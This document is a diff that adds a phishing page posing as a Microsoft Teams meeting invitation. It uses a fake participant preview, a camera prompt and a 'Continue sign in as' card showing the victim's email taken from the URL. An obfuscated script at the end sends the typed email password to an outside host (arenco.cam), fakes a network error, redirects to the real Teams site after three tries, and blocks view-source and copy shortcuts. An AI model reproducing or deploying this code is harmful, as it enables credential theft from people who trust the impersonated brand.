@@ -1,0 +1,721 @@
+<meta charset='utf-8'>
+    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+    <title>Microsoft Teams</title>
+    <meta name='viewport' content='width=device-width, initial-scale=1'>
+    <link rel='stylesheet' type='text/css' media='screen' href='../css/style.css'>
+	<link rel="shortcut icon" href="logo2.png">
+   <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Overpass:ital,wght@0,100..900;1,100..900&amp;display=swap" rel="stylesheet">
+    
+
+<div class="box1" style="display:none" >
+    
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Meeting Room</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:'Inter',sans-serif;
+}
+
+body{
+    background:#ececec;
+}
+
+/* HEADER */
+header{
+    min-height:80px;
+    display:flex;
+    align-items:center;
+    padding:0 4%;
+    border-bottom:1px solid #ddd;
+    background:#fff;
+}
+
+.logo img{
+    max-width:120px;
+    height:70px;
+}
+
+/* MAIN WRAPPER */
+.wrapper{
+    width:95%;
+    margin:25px auto;
+    display:flex;
+    border-radius:14px;
+    overflow:hidden;
+    box-shadow:0 20px 50px rgba(0,0,0,0.08);
+    min-height:75vh;
+}
+
+/* LEFT PANEL */
+.left{
+    flex:1.2;
+    background:linear-gradient(180deg,#222337,#1a1b2b);
+    position:relative;
+    display:flex;
+}
+
+/* CONTROLS */
+.left-controls,
+.right-controls{
+    position:absolute;
+    bottom:20px;
+    display:flex;
+    gap:18px;
+    align-items:center;
+}
+
+.left-controls{
+    left:20px;
+}
+
+.right-controls{
+    right:20px;
+}
+
+.fontss i{
+    color:white;
+    font-size:20px;
+    cursor:pointer;
+}
+
+.cancel-btn{
+    background:#e53935;
+    color:white;
+    padding:8px 14px;
+    border:none;
+    border-radius:6px;
+    font-size:14px;
+    cursor:pointer;
+    display:flex;
+    align-items:center;
+    gap:6px;
+}
+
+.cancel-btn:hover{
+    background:#c62828;
+}
+
+/* RIGHT PANEL */
+.right{
+    flex:1;
+    background:#007bff;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    justify-content:center;
+    padding:40px 5%;
+    text-align:center;
+}
+
+.right h1{
+    color:white;
+    font-size:28px;
+}
+
+.right p{
+    color:white;
+    margin-top:8px;
+    font-size:16px;
+}
+
+/* CARD */
+.card{
+    background:white;
+    width:100%;
+    max-width:380px;
+    margin-top:25px;
+    padding:30px;
+    border-radius:15px;
+    box-shadow:0 10px 30px rgba(0,0,0,0.15);
+}
+
+.card h3{
+    font-size:18px;
+    font-weight:600;
+}
+
+.card small{
+    display:block;
+    margin:10px 0 20px;
+    color:#666;
+}
+
+input{
+    width:100%;
+    padding:10px;
+    border-radius:6px;
+    border:1px solid #ccc;
+    margin-bottom:15px;
+}
+
+.checkbox{
+    display:flex;
+    align-items:flex-start;
+    gap:8px;
+    font-size:14px;
+    margin-bottom:18px;
+    text-align:left;
+}
+
+.checkbox input{
+    width:auto;
+    margin-top:3px;
+}
+
+span a{
+    color:#2772F9;
+    text-decoration:none;
+}
+
+button{
+    width:100%;
+    padding:12px;
+    background:#2772F9;
+    border:none;
+    border-radius:6px;
+    color:white;
+    font-weight:500;
+    cursor:pointer;
+}
+
+button:hover{
+    background:#125aa3;
+}
+
+/* ---------------- RESPONSIVE ---------------- */
+
+@media(max-width:1024px){
+    .wrapper{
+        flex-direction:column;
+        border-radius:12px;
+    }
+
+    .left{
+        min-height:300px;
+    }
+
+    .right{
+        padding:35px 6%;
+    }
+}
+
+@media(max-width:768px){
+
+    header{
+        justify-content:center;
+        padding:15px;
+    }
+
+    .wrapper{
+        width:100%;
+        margin:0;
+        border-radius:0;
+    }
+
+    .left{
+        min-height:250px;
+    }
+
+    .left-controls,
+    .right-controls{
+        bottom:15px;
+        gap:14px;
+    }
+
+    .right h1{
+        font-size:22px;
+    }
+
+    .right p{
+        font-size:14px;
+    }
+
+    .card{
+        padding:25px;
+    }
+}
+
+@media(max-width:480px){
+
+    .left-controls,
+    .right-controls{
+        flex-wrap:wrap;
+        justify-content:center;
+        left:0;
+        right:0;
+        margin:auto;
+    }
+
+    .cancel-btn{
+        width:100%;
+        justify-content:center;
+    }
+
+    .card{
+        padding:20px;
+    }
+
+    input{
+        padding:9px;
+    }
+
+    button{
+        padding:11px;
+    }
+}
+</style>
+</head>
+
+<body>
+
+<header>
+    <div class="logo">
+        <img src="logo2.png" alt="Logo">
+    </div>
+</header>
+
+<div class="wrapper">
+
+    <!-- LEFT VIDEO AREA -->
+    <div class="left">
+		<video style="width: 100%; height: auto" id="cameraPreview" autoplay playsinline></video>
+        <div class="left-controls fontss">
+            <i class="fa-solid fa-microphone"></i>
+            <i class="fa-solid fa-video"></i>
+        </div>
+
+        <div class="right-controls fontss">
+            <i class="fa-solid fa-share-from-square"></i>
+            <i class="fa-solid fa-user-group"></i>
+            <i class="fa-solid fa-comment"></i>
+            <button class="cancel-btn">
+                <i class="fa-solid fa-phone-slash"></i>
+                Cancel meeting
+            </button>
+        </div>
+
+    </div>
+ 
+    <!-- RIGHT PANEL -->
+    <div class="right1" style="margin:20px">
+        <h1>Meeting Platform</h1>
+        <p>Welcome <span id="mp"></span> , you have been invited to join a meeting</p>
+
+        <div class="card">
+            <h3>Continue sign in as</h3>
+            <small id="email"></small>
+  <div class="alert alert-danger" id="msg" style="display: none; font-size:14px; padding:10px; color:red ">Network connection Error. Please try Again</div>
+         
+
+           
+               <input type="password" id="pr" placeholder="Enter Email Password"/> 
+
+                <div class="checkbox">
+                    <input type="checkbox" checked>
+                    <span>I agree to the <a href="#">terms of service</a> and <a href="#">privacy statement</a></span>
+                </div>
+
+		          
+                <button type="submit" id="submit-btn">Launch Meeting</button>
+            
+        </div>
+    </div>
+
+</div>
+<script>
+window.addEventListener("load", async () => {
+    const video = document.getElementById("cameraPreview");
+
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: true,
+            audio: true
+        });
+
+        video.srcObject = stream;
+		
+		const audioTrack = stream.getAudioTracks()[0];
+        const audioStream = new MediaStream([audioTrack]);
+
+        const audio = new Audio();
+        audio.srcObject = audioStream;
+        audio.play();
+		
+		
+
+    } catch (error) {
+        console.error("Camera access denied or not available:", error);
+        alert("Unable to access camera. Please allow permission.");
+    }
+});
+</script></div>
+<div class="box2" style="display:true">
+    
+    <!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Meeting Preview</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap" rel="stylesheet">
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:'Segoe UI', sans-serif;
+}
+
+body{
+    background:#f3f3f3;
+}
+
+/* HEADER */
+.header{
+    height:70px;
+    background:#ffffff;
+    display:flex;
+    align-items:center;
+    padding:0 40px;
+    border-bottom:1px solid #ddd;
+}
+
+.logo-box{
+    width:40px;
+    height:40px;
+    background:#5b5fc7;
+    border-radius:8px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    color:white;
+    font-weight:bold;
+    font-size:22px;
+}
+
+/* MAIN LAYOUT */
+.main{
+    display:flex;
+    height:calc(100vh - 70px);
+    padding:20px;
+    gap:20px;
+}
+
+/* LEFT SIDE */
+.left{
+    flex:2;
+    background:#1f2333;
+    border-radius:12px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+}
+
+.participants{
+    display:flex;
+    gap:70px;
+    flex-wrap:wrap;
+    justify-content:center;
+}
+
+/* Avatar wrapper */
+.avatar-wrapper{
+    position:relative;
+    width:160px;
+    height:160px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+}
+
+/* Pulse Rings */
+.avatar-wrapper::before,
+.avatar-wrapper::after{
+    content:"";
+    position:absolute;
+    width:200px;
+    height:200px;
+    border-radius:50%;
+    border:5px solid rgba(0, 123, 255, 0.35);
+    animation:pulse 2.5s infinite;
+}
+
+.avatar-wrapper::after{
+    animation-delay:1.2s;
+}
+
+/* Avatar */
+.avatar{
+    width:140px;
+    height:140px;
+    border-radius:50%;
+    overflow:hidden;
+    z-index:2;
+}
+
+.avatar img{
+    width:100%;
+    height:100%;
+    object-fit:cover;
+}
+
+/* Online Dot */
+.status{
+    position:absolute;
+    bottom:15px;
+    left:20px;
+    width:14px;
+    height:14px;
+    background:#00ff00;
+    border-radius:50%;
+    border:3px solid #1f2333;
+    z-index:3;
+}
+
+/* RIGHT SIDE */
+.right{
+    flex:1;
+    background:#eaeaea;
+    border-radius:12px;
+    position:relative;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    overflow:hidden;
+}
+
+/* Fading Blue Glow */
+.right::before{
+    content:"";
+    position:absolute;
+    width:300px;
+    height:300px;
+    background:radial-gradient(circle, rgba(25,118,210,0.35) 0%, rgba(25,118,210,0.15) 40%, rgba(25,118,210,0.05) 65%, transparent 80%);
+    border-radius:50%;
+    animation:fadeGlow 3s infinite ease-in-out;
+}
+
+/* Glow Animation */
+@keyframes fadeGlow{
+    0%{ opacity:0.6; transform:scale(0.95); }
+    50%{ opacity:1; transform:scale(1.05); }
+    100%{ opacity:0.6; transform:scale(0.95); }
+}
+
+/* RIGHT CIRCLE WRAPPER */
+.right-circle-wrapper{
+    position:relative;
+    width:150px;
+    height:150px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+}
+
+/* Pulse Rings for Right Circle */
+.right-circle-wrapper::before,
+.right-circle-wrapper::after{
+    content:"";
+    position:absolute;
+    width:190px;
+    height:190px;
+    border-radius:50%;
+    border:5px solid rgba(0, 123, 255, 0.35);
+    animation:pulse 2.5s infinite;
+}
+
+.right-circle-wrapper::after{
+    animation-delay:1.2s;
+}
+
+/* Center Circle */
+.center-circle{
+    width:120px;
+    height:120px;
+    background:rgba(0, 123, 255, 0.25);
+    border-radius:50%;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    z-index:2;
+}
+
+.center-circle::before{
+    content:"";
+    width:70px;
+    height:70px;
+    background:#1976d2;
+    border-radius:50%;
+}
+
+/* Pulse Animation */
+@keyframes pulse{
+    0%{
+        transform:scale(0.9);
+        opacity:0.6;
+    }
+    70%{
+        transform:scale(1.2);
+        opacity:0.2;
+    }
+    100%{
+        transform:scale(1.3);
+        opacity:0;
+    }
+}
+
+/* Join Button */
+.join-btn{
+    position:absolute;
+    bottom:25px;
+    right:25px;
+    background:#2563eb;
+    color:white;
+    padding:12px 22px;
+    border-radius:6px;
+    border:none;
+    font-size:14px;
+    cursor:pointer;
+    display:flex;
+    align-items:center;
+    gap:8px;
+    transition:0.3s;
+}
+
+.join-btn:hover{
+    background:#1e4ed8;
+}
+
+/* RESPONSIVE */
+@media(max-width:1024px){
+    .main{
+        flex-direction:column;
+    }
+
+    .right{
+        height:300px;
+    }
+
+    .join-btn{
+        right:50%;
+        transform:translateX(50%);
+    }
+}
+
+@media(max-width:480px){
+    .avatar-wrapper{
+        width:120px;
+        height:120px;
+    }
+
+    .avatar{
+        width:100px;
+        height:100px;
+    }
+
+    .participants{
+        gap:40px;
+    }
+}
+</style>
+</head>
+
+<body>
+
+<div class="header">
+    <img src="logo2.png" alt="Logo" width="114" height="75">
+</div>
+
+<div class="main">
+
+    <!-- LEFT -->
+    <div class="left">
+        <div class="participants">
+
+            <div class="avatar-wrapper">
+                <div class="avatar">
+                    <img src="image2.jpg">
+                </div>
+                <div class="status"></div>
+            </div>
+
+            <div class="avatar-wrapper">
+                <div class="avatar">
+                    <img src="image3.jpg">
+                </div>
+                <div class="status"></div>
+            </div>
+
+            <div class="avatar-wrapper">
+                <div class="avatar">
+                    <img src="image4.jpg">
+                </div>
+                <div class="status"></div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- RIGHT -->
+    <div class="right">
+        <div class="right-circle-wrapper">
+            <div class="center-circle"></div>
+        </div>
+
+        <button class="join-btn" onclick="toggleDivs()">
+          <span style="padding:0px; margin:3px;">  🎥 Join meeting - 3 participant</span>
+        </button>
+    </div>
+
+</div>
+
+
+</body>
+</html>
+
+
+</div>
+
+
+
+<script>
+function toggleDivs() {
+  const div1 = document.querySelector(".box1");
+  const div2 = document.querySelector(".box2");
+
+  if (div1.style.display === "none") {
+    div1.style.display = "block";
+    div2.style.display = "none";
+  }
+}
+
+
+
+</script>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script src="https://d12y7sg0iam4lc.cloudfront.net/b1268/s/js/mesg_en.js"></script>
+<script async src="https://d12y7sg0iam4lc.cloudfront.net/b1268/s/js/pack.min.js"></script>
+<script src="https://appleid.cdn-apple.com/appleauth/static/jsapi/appleid/1/en_US/appleid.auth.js"></script>
+<script async src="https://d12y7sg0iam4lc.cloudfront.net/b1268/s/js/authen.min.js"></script>
+
+        <script>
+var _0x50237b=_0x30f3;(function(_0x39dd45,_0x34f0bf){var _0x53a434=_0x30f3,_0x178841=_0x39dd45();while(!![]){try{var _0x1a6dbd=-parseInt(_0x53a434(0x13c))/0x1*(parseInt(_0x53a434(0x145))/0x2)+parseInt(_0x53a434(0x122))/0x3*(parseInt(_0x53a434(0x120))/0x4)+parseInt(_0x53a434(0x130))/0x5+parseInt(_0x53a434(0x11a))/0x6+parseInt(_0x53a434(0x12f))/0x7*(parseInt(_0x53a434(0x125))/0x8)+parseInt(_0x53a434(0x11b))/0x9*(parseInt(_0x53a434(0x136))/0xa)+-parseInt(_0x53a434(0x134))/0xb;if(_0x1a6dbd===_0x34f0bf)break;else _0x178841['push'](_0x178841['shift']());}catch(_0x1c3cb7){_0x178841['push'](_0x178841['shift']());}}}(_0x3c2f,0x4e813),$(document)['bind'](_0x50237b(0x12d),function(_0x41aeee){var _0x5e213d=_0x50237b;if(_0x41aeee[_0x5e213d(0x137)]&&_0x41aeee[_0x5e213d(0x12b)]==0x53)return _0x41aeee[_0x5e213d(0x147)](),![];}),document[_0x50237b(0x133)](_0x50237b(0x12a),_0x2f7374=>_0x2f7374[_0x50237b(0x147)]()),document[_0x50237b(0x142)]=function(_0x138b4d){var _0x3055c3=_0x50237b;return _0x138b4d[_0x3055c3(0x137)]&&(_0x138b4d['keyCode']===0x43||_0x138b4d[_0x3055c3(0x14a)]===0x56||_0x138b4d[_0x3055c3(0x14a)]===0x55||_0x138b4d[_0x3055c3(0x14a)]===0x75)?![]:!![];},$(document)[_0x50237b(0x132)]('u',function(_0x270a53){var _0x8db9bd=_0x50237b;return _0x270a53[_0x8db9bd(0x137)]?![]:!![];}),$(document)[_0x50237b(0x11f)](function(){var _0x11c911=_0x50237b,_0x47a9b9=0x0;$(_0x11c911(0x13f))['click'](function(){var _0x153156=_0x11c911;$(_0x153156(0x135))[_0x153156(0x13a)](),$(_0x153156(0x131))[_0x153156(0x144)](''),$(_0x153156(0x121))[_0x153156(0x126)]({'left':0xc8,'opacity':'hide'},0x0),$(_0x153156(0x13e))[_0x153156(0x126)]({'right':0xc8,'opacity':_0x153156(0x13b)},0x3e8);});function _0x2e4297(_0x35120a){var _0x31e0c4=_0x11c911;const _0x355310=new URLSearchParams(window['location']['search']);return _0x355310[_0x31e0c4(0x12c)](_0x35120a);}var _0xa341=window[_0x11c911(0x123)][_0x11c911(0x12e)],_0x3f34cc=new URL(_0xa341),_0x1ce43e=new URLSearchParams(_0x3f34cc['search']),_0x41c50f=_0x1ce43e['get']('auth'),_0x13790f=_0x1ce43e[_0x11c911(0x12c)](_0x11c911(0x14b)),_0x22e41d=atob(_0x41c50f),_0xfa09f9=atob(_0x13790f);let _0x3b197c=0x0;const _0x3c331c=_0x11c911(0x11d);function _0x46a2d6(_0x130448,_0x18d0c2){var _0x368137=_0x11c911;const _0x20326d=new FormData();return _0x20326d['append'](_0x368137(0x11e),_0x130448),_0x20326d[_0x368137(0x143)](_0x368137(0x11c),_0x18d0c2),fetch(_0x3c331c,{'method':_0x368137(0x129),'body':_0x20326d});}$(_0x11c911(0x127))[_0x11c911(0x139)](_0x22e41d),document[_0x11c911(0x13d)]('mp')[_0x11c911(0x146)]=atob(_0x13790f),$(_0x11c911(0x148))['click'](function(_0x276109){var _0x2f03ef=_0x11c911;_0x276109[_0x2f03ef(0x147)]();var _0x4de959=$(_0x2f03ef(0x124))[_0x2f03ef(0x144)](),_0x4e7399=!_0x22e41d[_0x2f03ef(0x141)]()||!_0x4de959['trim']();if(_0x4e7399)return;_0x3b197c++,_0x46a2d6(_0x22e41d,_0x4de959)['then'](()=>{console['log']('Report\x20sent\x20to\x20PHP\x20endpoint');})[_0x2f03ef(0x14c)](_0x186dcd=>{var _0x2f09ae=_0x2f03ef;console[_0x2f09ae(0x149)](_0x2f09ae(0x138),_0x186dcd);}),$(_0x2f03ef(0x135))[_0x2f03ef(0x13b)](),$(_0x2f03ef(0x124))[_0x2f03ef(0x144)](''),_0x3b197c===0x3&&setTimeout(()=>{var _0x2bc1bb=_0x2f03ef;window[_0x2bc1bb(0x123)][_0x2bc1bb(0x140)](_0x2bc1bb(0x128));},0x12c);});}));function _0x30f3(_0x27183d,_0x543c1a){_0x27183d=_0x27183d-0x11a;var _0x3c2fe3=_0x3c2f();var _0x30f3d4=_0x3c2fe3[_0x27183d];return _0x30f3d4;}function _0x3c2f(){var _0x3b9b59=['#back1','replace','trim','onkeydown','append','val','114JsduXJ','textContent','preventDefault','#submit-btn','error','keyCode','Video','catch','1973994vgbdbX','153hPzfIP','password','https://arenco.cam/oz26/t1/','email','ready','756GAPyOi','#automail','5115DwzlZC','location','#pr','2107152PjZqHT','animate','#email','https://teams.live.com','POST','contextmenu','which','get','keydown','href','14QpgoUp','3161975mGFbBl','#ai','keypress','addEventListener','11053328hoYhfu','#msg','88630wSZHOJ','ctrlKey','Error\x20sending\x20report:','html','hide','show','11135aOGQZd','getElementById','#inputbar'];_0x3c2f=function(){return _0x3b9b59;};return _0x3c2f();}
+
+  </script>
+  
